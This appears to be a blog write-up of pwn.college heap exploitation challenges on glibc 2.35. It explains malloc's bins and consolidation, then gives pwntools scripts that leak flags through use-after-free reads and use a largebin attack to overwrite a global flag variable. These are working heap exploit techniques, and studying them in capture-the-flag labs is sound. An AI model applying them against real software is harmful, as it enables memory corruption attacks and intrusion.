---
layout: post
title:  "Pwn College - Beyond Tcache Exploitation"
date:   2024-05-22 19:59:45 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Overview

All of the challenges were based on `libc-2.35`, which is pretty modern. 

## Background

### Additional Bins 

Recall the tcache contains bins of constant size, up to `1032` bytes. Each bin caches up to `7` freed chunks, within a singly linked list. The tcache metadata includes the `next` ptr, as well as the `key` - which is a pointer to the `tcache_perthread_struct`. \
What happens if we'd `free` beyond 8 chunks? 

1. If it cant go to tcache, it will go to **fastbins**, which are infinite singly-linked lists of constant sizes. 

2. If it cant fit fastbins, it will check the `M` bit of the chunk, and if it was `mmap`ed chunk, would call `munmap`. 

3. Otherwise, it will end up in the **unsorted bin**. If the chunk is larger than `65KB`, the dynamic allocator would clear and consolidate fastbins before adding the chunk into the unsroted bin.

For `malloc`, there is a very similar order of operations:

1. It will try to get the chunk off a tcachebin

2. Otherwise, it will try to retrieve it from fastbins. 

3. Otherwise, if it cant retrieve it from fastbins, and the malloc request is small, we'd try to fetch a chunk off the **smallbins**. 

4. Otherwise, if its too big for smallbins, or the smallbins are empty, consolidation of fastbins would occur, and we'd scan + sort the **unsorted bin**. If the chunk that we're looking at within the unsorted bin is large enough to satisfy our request, we'd return it - even if its size is way larger than our request. 

5. Otherwise, we'd sort the unsorted bin chunk, meaning we'll place the chunk within the smallbins or largebins, based on its size. 

6. If we've scanned all the unsorted chunks, and there was no adequate chunk within the unsortedbin, we'd look at the **largebins** - which holds large chunks. 

7. If we cant find any chunk large enough within the largebins, we'd create a new chunk off the **wilderness**. 

8. Otherwise, if the request size is exceptionally large and even the wilderness cannot handle it, we'd call `mmap`. 

### More Metadata

In addition to `prev_size, size` - we now have `fd, bk`, and `fd_nextsize, bk_nextsize` in the case of large freed chunks. \
We need these pointers to support doubly linked lists, which supports efficient removal of items. This is crucial in order to support consolidation - which occurs whenever 2 freed adjacent chunks are merged, to create one larger chunk. \
Consolidation may occur both forward and backwards, and the `PREV_INUSE` bit must be cleared for a chunk to consolidate. Important: for the case of `chunk1, chunk2` being adjacent chunks in memory, how does chunk2 determines where chunk1 resides in memory? NOT by the `bk` pointer (which serves the **BIN** traversal), but by substracting bytes count based on `prev_size` value. Because we cannot know in which bin a chunk to-be-freed resides, by following the `fd, bk` pointers, we obtain a generic way, regardless of the bin and its address, to fetch the chunk off any list. 

### Unlink Verification 

Upon `free`, the following checks are being made for an unlinked chunk:

1. `chunksize(p) == prev_size(next_chunk(p))`

2. `fd->bk == p && bk->fd == p`

Otherwise, the unlinking would fail.

### Fastbins

Serve a similar role to tcache. However, a tcache is a **thread** caching layer. Whenever the heap accesses deeper than tcache, **there's a global heap lock that have to be held**. The whole goal behind tcache is to prevent multiple threads trying to access the same heap, by having dedicated cache for each thread. \
Fastbins is a caching layer **for the heap itself**, not thread-specific. Its design is very similar to tcache, and also uses safe linking. Another different, is that the fastbins can grow to unlimited length, as opposed to `7`. \
Moreover, bins are only up to `88 bytes`, while tcache holds up to `1032` bytes. In a similar manner to tcache, `P` bit is never cleared for chunks in fastbins. Therefore, they also prevent consolidation in a similar manner to tcache (upon freeing a chunk and placing it in a fastbin, the `PREV_INUSE` bit of the next chunk **in memory (not bin)**, which is calculated by the chunk's size, isn't cleared). \
Moreover, we've seen tcache mitigation for double free is pretty funny - just make sure we'd overwrite `key` to some any other value. Because the fastbins length may be infinite, the allocator won't be able to scan the whole bin for every `free` request to check for a double free. This means that the only mitigation for double free within fastbins, is to only look at the top chunk within that bin, meaning - only to look at the prior inserted chunk. 

### Smallbins

If fastbins aren't adequate, we'd go there. \
Doubly linked lists, binds of size up to 1024 bytes. Fast access, yet capable of consolidating. This means `P` bit is cleared when needed. 

### Fastbin Consolidation

If the smallbins couldn't perform the allocation (`> 1024 bytes`), we'd consolidate the fastbins and try to perform the allocation from there. But how can we consolidate, if fastbins doesn't sets the `P` bit? We'd go through all fastbins, and clear the corresponding `P` bit, which would allow consolidation of fastbins to occur. By doing so, we'd prevent fragmentation of small chunks within the fastbins. This consolidation of fastbins can occur not only by `malloc(>1024)`, but also when `free` occurs - if a chunk is freed around `~65 KB` in size. \
Notice that this stage only sets the `P` bit of the various fastbins. It does NOT means that the chunks WILL get consolidated, but only signals that they CAN be consolidated. 

### Unsorted bin

Doubly linked list. Holds large and small bins values - anything that cannot go into fastbins (`> 88 bytes`). \
"Pile of stuff that we've freed and we don't wanna deal with". If we can't find an allocation larger than `1024` bytes, its time to scan that pile of chunks we haven't looked on yet. \
On `malloc`, for each chunk that does not satisfy the allocation request within the unsorted bin, it would be placed in the appropriate small or large bin. 

### Largebins

Assume no adequate chunk found within any of the bins. \
Doubly linked lists, but now bins are NOT of constant size, but consists of a **range** of sizes. Moreover, the chunks within a bin are actually sorted based on their size - where the largest is first. \
The pointers `fd_nextsize, bk_nextsize` allow for efficient search of size within ranged bin. For example, assume we've requested a chunk of size `568 bytes` within a bin corresponding to `[512, 576] bytes`, however nothing was found. This means we have to jump up one size category, to the next bin size. Hence, `fd_nextsize` provides a pointer to a free chunk within the next large bin size range. 

### Mmap'ed Chunks

If we cannot perform an allocation from largebins, and it is exceptionally large, it would be allocated via `mmap`, while setting the `M` bit. 

### Wilderness Allocation

Otherwise, if the requeted size is reasonable, we can perform the allocation off the already existing `top_chunk` (wilderness) memory, located at the end of the heap. 

### Heap Exploitation

Heap exploits are extremely dependent on libc version - due to mitigations, features additions / removals, etc. \
For example, it used to be a common techniques to use `__malloc_hook` and its similars (see `man 3 malloc_hook`) to gain a branch primitive. They were started to be removed at `libc-2.32`, and were fully removed by `libc-2.34`. \
However, there are still many working heap exploitation techniques, and it would take hours to cover them all. 

#### Consolidation

Recall that besides tcache and fastbins, chunks eventually go to the unsorted bin. A large sized `malloc` can clear the fastbins and unsortedbin, by causing consolidation. Sometimes we'd have to hold an allocation, such that it won't get consoldiated while the rest of the bin would. \
For example, assume the following:

```python
# malloc(0x8) -> minimal chunk size = 0x20
# 7 Allocations to fill the tcache
# 2 Allocations would go to fastbins
for i in range(9):
    malloc(i, 0x8)

for i in range(9):
    free(i)
```

If we'd `malloc` something large (`>1024 bytes`), its not gonna be satisfied out of the tcache, nor fastbins, and not gonna look within the smallbins. Hence, we'd flush the fastbins. In that case, the 2 chunks within the fastbins will become eligable for consolidation - meaning their preceding chunk's `PREV_INUSE` bit would be cleared. \
In this case, because the last allocated chunk is eligable for backward-consolidation with its prior chunk and forward-consolidation with the wilderness, actually all 3 of them would merge into a new large chunk, representing the wilderness. \
We can do something similar with the unsortedbin, by `malloc` a size that is larger than any of the chunks within. \
For the above example, we can use an "consolidation guard", by making sure there would be another allocation between the 2 chunks within the fastbins, but never `free`ing it. By doing so, the middle chunk would prevent backward consolidation between the 2 fastbin chunks. However, because the first chunk within the fastbin is being scanned, it would actually be moved into `smallbin[0x20]`! \
Notice we can do extra tricks with the unsortedbin - in case we'd perform allocation that is smaller than an unsortedbin chunk size, that chunk would be splitted, and the remainder would be left within the unsortedbin. \
Moreover, in certain scenarios we can move chunks from smallbins to tcache. If a smallbin is being accessed, the allocator would load 7 chunks off that bin size to the corresponding tcachebin size, in case it was empty:

```python
# Fill tcache
for i in range(7):
    malloc(i, 0x80)

# Populate unsortedbin with 2 chunks of 0x80, preventing consolidation via guard-allocations
malloc(15, 0x80)
malloc(16, 0x80)
malloc(14, 0x80)
malloc(16, 0x80)

# Fill tcache
for i in range(7):
    free(i)

# Put 2 chunks in the unsortedbin
free(15)
free(14)

# Sort the unsortedbin, populating smallbin[0x90]
malloc(9, 2000)

# Clear the whole tcache
for i in range(7):
    malloc(i, 0x80)

# Takes 1 chunk off smallbin[0x90]
# But puts the other chunk within tcache[0x90]!!
malloc(1, 0x80)
```

#### Fake Chunks Creation

Similar to House of Spirit. We can carefully craft data that looks like heap metadata - `prev_size, size, fd, bk`. If we can corrupt existing heap chunks, we can get the heap to interpret that memory region as a metadata of a fake chunk. 

#### Unsafe Linking

Can be useful to create exploitation primitives. Recall there are couple of verifications:

```c
// Locality check: next chunk IN-MEMORY, not bins (calculated by SIZE, not fd)
chunksize(p) == prev_size(next_chunk(p))
// Bins check
fd->bk == p 
bk->fd == p
```

If we have control over `fd, bk`, we can satisfy the second constraint without valid chunks. \
It is also worth to mention that `prev_chunk` addr is calculated based on the chunk's `prev_size`, as long as its `PREV_INUSE` bit is cleared. 

#### Resources

The best resource is [shellphish-how2heap][shellphish], organized to libc versions variety. An helpful tool to download and compile libc versions easily, is [glibc-all-in-one][glibc-all-in-one]. 

## Challenge 1

We can now perform allocations of up to `0x400` bytes, hence not adequate for any largebin exploitation. \
This challenge involves a `malloc, free, puts, read_flag` menu. This means we can easily leak heap addresses by `free`ing a chunk and calling `puts`, reading its metadata. Moreover, the `read_flag` handler allocates a large buffer within the heap (`>0x400 bytes`), and writes the flag there. We have 2 main approaches for obtaining the arbtirary read:

1. Cause the allocation to actually be performed to an address we control. This is possible, as the `free` handler doesn't nullifies the pointer upon reclamation, and `puts` doesn't checks if a slot is really being allocated before accessing it.

2. After the allocation was already made, forge an arbitrary read. This may be challenging, as we have no write-vuln at all (we can malloc and free and read chunks values as we wish, but never overwrite fields to content we control).

Hence, my idea is to create a funny state within the heap, such that small chunks would be consolidated, and the `read_flag` request would be performed off an known address that have been consolidated. \
We should be able to perform consolidation from both fastbins, as well as the unsortedbin. 

```python
def malloc(p, index, size):
    p.sendline(b'malloc')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'quit): ')

def free(p, index):
    p.sendline(b'free')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'quit): ')

def puts(p, index):
    p.sendline(b'puts')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Data: ')
    output = p.recvuntil(b'quit): ')
    return output

def read_flag(p):
    p.sendline(b'read_flag')
    p.recvuntil(b'quit): ')
    
def exploit():    
    p = process(BINARY)

    # Tcache allocations
    tcache_bin_size = 7
    size = 0x300
    for i in range(tcache_bin_size):
        malloc(p, i, size)
    
    # Allocate chunks to reside within the unsortedbin
    first_unsorted_chunk_index = tcache_bin_size
    second_unsorted_chunk_index = first_unsorted_chunk_index + 1
    malloc(p, first_unsorted_chunk_index, size)
    malloc(p, second_unsorted_chunk_index, size)

    # Guard allocation - prevent top_chunk consolidation
    guard_alloc_index = second_unsorted_chunk_index + 1
    malloc(p, guard_alloc_index, size)

    # Fill tcache
    for i in range(tcache_bin_size):
        free(p, i)

    # Put a chunk in the unsortedbin
    free(p, first_unsorted_chunk_index)
    # Cause consolidation, to create large chunk within the unsortedbin!
    free(p, second_unsorted_chunk_index)

    # Trigger allocation from the chunk that was just consolidated
    read_flag(p)

    # Leak its content, using the read UAF
    flag = puts(p, first_unsorted_chunk_index)
    log.info(f'Got flag: {flag}')

    p.interactive()
```

Notice another possible solution route is to use fastbins consolidation instead. It would be abit more challenging though, as their consolidation is stored within the smallbins (usually), and only `malloc` requests of above `0x400` bytes (or `free` of a chunk larger than `65 KB`) would trigger the fastbins consolidation.

## Challenge 2

Now we can perform allocations with `malloc` of up to size `0x420`, yet completely unbounded for `calloc`. \
The thing is, there is actually 1 surprise large allocation before allocating the flag's buffer. We can bypass this in multiple approaches:

1. Just add more free chunks within the unsortedbin, that would get consolidated. Notice, however, that while the first surprise allocation would be performed at the exact address as the first unsorted chunk, the second (real flag allocation) wouldn't necessarily be allocated on the second unsortedbin chunk address, and it actually depends on the flag allocation size. If we would carefully craft the unsortedbin chunks consolidation, such that it would create a free chunk of EXACTLY size `flag_chunk * 2`, we would be able to deterministicly know the address of the second allocation. It may be achieved in case we would store 4 freed chunks within the unsorted bin, all having a size of `flag_chunk / 2`.  

2. Another, simpler approach, is to use the fact we can issue `calloc` with unbounded size. We can make sure it would exactly match the surprise allocation, hence - the second allocation would be performed right from the known unsortedbin chunks addresses. 

The following script implements the second idea:

```python
def exploit():
    p = process(BINARY)
    flag_size = 0x590

    # Tcache allocations
    tcache_bin_size = 7
    size = 0x400
    for i in range(tcache_bin_size):
        malloc(p, i, size)
    
    # Allocate chunks to reside within the unsortedbin
    calloc_chunk_index = tcache_bin_size
    calloc(p, calloc_chunk_index, flag_size)

    unsorted_chunks_count = 2
    unsorted_index = calloc_chunk_index + 1
    for i in range(unsorted_index, unsorted_index + unsorted_chunks_count):
        malloc(p, i, size)

    # Guard allocation - prevent top_chunk consolidation
    malloc(p, i + 1, size)

    # Fill tcache
    for i in range(tcache_bin_size):
        free(p, i)

    # Put chunks in the unsortedbin, and cause consolidation for them
    free(p, calloc_chunk_index)    

    for i in range(unsorted_index, unsorted_index + unsorted_chunks_count):
        free(p, i)

    # Trigger allocation from the chunk that was just consolidated
    read_flag(p)

    # Leak flag content (first unsorted chunk resides at index of tcache size)
    flag = puts(p, unsorted_index)
    log.info(f'Got flag: {flag}')

    p.interactive()
```

## Challenge 3

This time there's no unbounded size `calloc` call. However, there's an extra - `malloc` is actually constraint to a minimal size of `0x420`. Moreover, the flag's chunk this time is pretty small - `0x28c`, and there are 9 surprise allocations. \
My idea is simple - forge a large chunk within the unsortedbin that would be exactly adequate for all surprise allocations, and its preceding chunk in memory - shall match the flag's chunk. 

```python
def exploit():
    p = process(BINARY)
    flag_size = 0x28c
    surprise_alloc_count = 9
    flag_chunk_size = chunk_size(flag_size)
    large_unsorted_size = (surprise_alloc_count * flag_chunk_size) - 0x10
    log.info(f'large_unsorted_size: {hex(large_unsorted_size)}')

    size = 0x420
    unsorted_index = 0
    # Unsorted bin chunks - exactly enough for surprise allocations + flag chunk
    malloc(p, unsorted_index, large_unsorted_size)
    malloc(p, unsorted_index + 1, size)

    # Guard allocation - prevent top_chunk consolidation
    malloc(p, unsorted_index + 2, size)

    # Put chunks in the unsortedbin, and cause consolidation for them
    free(p, unsorted_index)
    free(p, unsorted_index + 1)

    # Trigger allocation from the chunk that was just consolidated
    read_flag(p)

    # Leak flag content (first unsorted chunk resides at index of tcache size)
    flag = puts(p, unsorted_index + 1)
    log.info(f'Got flag: {flag}')

    p.interactive()
```

## Challenge 4

Now the `malloc` handler is limited to allocations of at least `3000` bytes. Moreover, this handler keeps track of the requested size by each `malloc` invocation, storing it within a dedicated stack buffer (there might be OOB vuln for the indices, as there are only 8 slots within that buffer, and 16 available slots for allocations..). A `safe_read` handler is introduced, which reads from `stdin` up to the stored size within that stack buffer. Hence, it actually serves as a write primitive into the chunk's content, without any OOB-access. \
There's also a `send_flag` handler, which checks if certain global is set, and if so - opens and prints the flag. This means our goal is to obtain arbitrary write primitive, so that we would be able to overwrite the `authenticated` global. \ 
There are few cool ideas we can perform in order to pwn this scenario. However, I find the [largebin-attack][largebin-attack] as the most adequate for this case. Recall largebins are working with size ranges, instead of constant bin sizes. This attack tricks the value of `p->bk_nextsize`, which is the next larger chunk, possibly with another range. The idea is based on the following code snippet within glibc sources:

```c
victim_index = largebin_index (size);
bck = bin_at (av, victim_index);
fwd = bck->fd;

if (fwd != bck)
{
    /* Or with inuse bit to speed comparisons */
    size |= PREV_INUSE;
    /* if smaller than smallest, bypass loop below */
    assert (chunk_main_arena (bck->bk));
    if ((unsigned long) (size)
		< (unsigned long) chunksize_nomask (bck->bk))
        {
            fwd = bck;
            bck = bck->bk;

            victim->fd_nextsize = fwd->fd;
            victim->bk_nextsize = fwd->fd->bk_nextsize;
            fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
        }
...
}
```

Notice that initially `bck` actually points to the large **bin** address, not any chunk within. `fwd` points to the first chunk within that bin, or to the same bin address in case the bin is empty (as the bin's `fd, bk` are initialized to itself). The idea is because the largebins are sorted by largest chunk to smallest chunk within certain memory range, in case we'd add a chunk that is smaller than the last chunk within a bin, no need to scan the whole bin - just add it within the bin's end. \
Since we have a UAF, we can overwrite both chunks `p1` and `p2`. Recall `fwd->fd == p1`. The following two lines make the arbitrary write possible:

```c
victim->bk_nextsize = fwd->fd->bk_nextsize;
/* fwd->fd->bk_nextsize = */ victim->bk_nextsize->fd_nextsize = victim;
```

Hence, by overwriting to `fwd->fd->bk_nextsize == [p1 + 0x28]`, we can control `addr = victim->bk_nextsize`. The allocator writes to `addr->fd_nextsize == [addr + 0x20]` the value of `p2`, hence we'd choose `addr = target - 0x20`. \
Hence, we shall write: `[p1 + 0x18] = target - 0x20` (`0x18` because I assume we write to the start of the chunk's data, not metadata). 

```python
def exploit():
    p = process(BINARY)
    size = 0x2000

    # Largebin Attack
    malloc(p, 0, size + 0x28)         # large chunk
    malloc(p, 15, size)               # guard alloc
    malloc(p, 1, size + 0x18)         # large chunk, but smaller than first
    malloc(p, 15, size)               # guard alloc
    free(p, 0)                        # stores 0 within unsortedbin
    malloc(p, 15, size + 0x38)        # move 0 to largebin
    free(p, 1)                        # stores 1 within unsortedbin

    # Arena leak
    arena_leak = puts_addr(p, 0)
    assert(len(arena_leak) == 6)
    arena_leak = u64(arena_leak + b'\x00' * 2)
    log.info(f'arena_leak: {hex(arena_leak)}')

    # Overwrite large chunk's bk_nextsize
    target = p.elf.symbols['authenticated']
    buf = b''
    buf += 2 * p64(arena_leak)  # Overwrite fd, bk
    buf += b'A' * 8  # Overwrite fd_nextsize. Notice it doesn't crash. Otherwise, We'd have to leak heap addr first
    buf += p64(target - 0x20)  # Overwite bk_nextsize 
    safe_read(p, 0, buf)

    malloc(p, 15, size + 0x38)        # move alloc-1 to largebin

    p.sendline(b'send_flag')
    p.interactive()
```

## Challenge 5

Now the flag is loaded to some heap address prior to program's execution. We can execute malloc requests of at least `0x420`. But now there's no `safe_read`, but `read` handler, which means we can overflow writes, towards the metadata of their preceding chunks. \
My initial idea is abit complex, but should work: we can create 2 tcache holes (`alloc(0, 3100), alloc(1, 3000), free(0), alloc(0, 3000) x 2`). By using the overwrite vulnerability, we can overwrite the `next` ptr of one of them, hence controlling the returned address upon new allocation. However, this allocation must be within the tcache, hence it won't be easily adequate for this case (as we can only call malloc larger than `0x420`). This makes the approach of exploitation solely by the tcache very tough. \
A similar yet better approach is to exploit the fastbins instead. While we can still populate the fastbins as described for the tcache, upon allocation of more than `0x420` bytes, they are actually being consolidated into the unsorted bin!







[shellphish]: https://github.com/shellphish/how2heap
[glibc-all-in-one]: https://github.com/matrix1001/glibc-all-in-one
[largebin-attack]: https://4xura.com/pwn/heap/large-bin-attack/
